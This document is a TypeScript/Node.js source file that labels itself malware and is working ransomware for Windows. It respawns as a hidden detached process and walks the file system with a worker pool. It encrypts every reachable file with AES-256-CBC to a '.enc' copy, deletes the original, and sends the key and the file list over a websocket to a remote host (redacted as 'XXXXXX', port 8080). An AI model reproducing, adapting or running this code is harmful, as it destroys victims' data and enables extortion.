import ChildProcess, { ForkOptions } from "child_process";
import { WorkerPool } from "./src/WorkerPool";
import http from "http";
import crypto from "crypto";
import fs from "fs";

if (process.platform !== "win32") {
    console.log("This malware only works on Windows.");
    process.exit(0);
}

if (!process.env.child_service) {
    ChildProcess.spawn(__filename, [], { detached: true, stdio: 'ignore', windowsHide: true, env: { child_service: "true" } }).unref();
    process.exit(0);
}

type ReaddirResult = {
    files: string[];
    dirs: string[];
};

const key = crypto.randomBytes(32);

const pool = new WorkerPool<string, ReaddirResult>(10, (args: any[]) => {
    const fs = global['require']("fs");
    const fsp = fs.promises;
    const Path = global['require']('path');
    const crypto = global['require']('crypto');

    const key = Buffer.from(process.argv[2], 'hex');

    return async (path: string) => {
        let paths;
        try {
            paths = await fsp.readdir(path);
        } catch (e) {
            return {
                files: [],
                dirs: [],
            };
        }

        const newPaths = paths.map((p: string) => Path.join(path, p));

        const files = [];
        const dirs = [];

        let promises = [];
        for (const path of newPaths) {
            promises.push((async () => {
                try {
                    const stat = await fsp.lstat(path);
                    if (stat.isDirectory()) {
                        dirs.push(path);
                    } else if (stat.isFile()) {
                        files.push(path);
                    }
                } catch (e) {

                }
            })());
            if (promises.length === 100) {
                await Promise.all(promises);
                promises = [];
            }
        }

        if (promises.length > 0) {
            await Promise.all(promises);
            promises = [];
        }

        const fileInfo = [];

        for (const file of files) {
            promises.push(new Promise<void>((resolve) => {
                try {
                    const stream = fs.createReadStream(file);
                    const writeStream = fs.createWriteStream(`${file}.enc`);
                    const iv = crypto.randomBytes(16);
                    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

                    stream.on('close', () => {
                        try {
                            writeStream.end();
                            fsp.rm(file).catch(() => { });
                        } catch (e) {

                        }
                        fileInfo.push({ path: file, iv: iv.toString('hex') });
                        resolve();
                    });
                    stream.on('error', () => {
                        resolve();
                    });
                    stream.on('data', chunk => {
                        try {
                            writeStream.write(cipher.update(chunk));
                        } catch (e) {
                            stream.close();
                            resolve();
                        }
                    });
                } catch (e) {
                    resolve();
                }
            }));

            if (promises.length === 100) {
                await Promise.all(promises);
                promises = [];
            }
        }
        if (promises.length > 0) {
            await Promise.all(promises);
            promises = [];
        }

        return {
            files: fileInfo,
            dirs,
        }
    };
}, [key.toString('hex')]);


try {
    const req = http.request({
        host: 'XXXXXX',
        port: 8080,
        headers: {
            'Connection': 'Upgrade',
            'Upgrade': 'websocket'
        }
    });

    req.on('upgrade', (res, socket, head) => {
        const dirs = [];
        const files = [];

        pool.on("taskCompleted", (task) => {
            for (const path of task.result.dirs) {
                pool.run(path);
                dirs.push(path);
            }
            for (const path of task.result.files) {
                files.push(path);
            }

            try {
                socket.write(JSON.stringify({
                    key: key.toString('hex'),
                    files: task.result.files,
                }));
            } catch (e) {
            }
        });

        pool.on("taskRejected", (task) => {
            console.log(task);
        });

        const start = Date.now();

        pool.wait().then(() => {
            console.log(`Files: ${files.length}, Dirs: ${dirs.length}`);
            console.log(`Time: ${(Date.now() - start) / 1000}s`);
            pool.destroy();
            socket.end();
            socket.destroy();
        });
    });

    req.end();
} catch (e) {
    console.log(e);
    pool.destroy();
}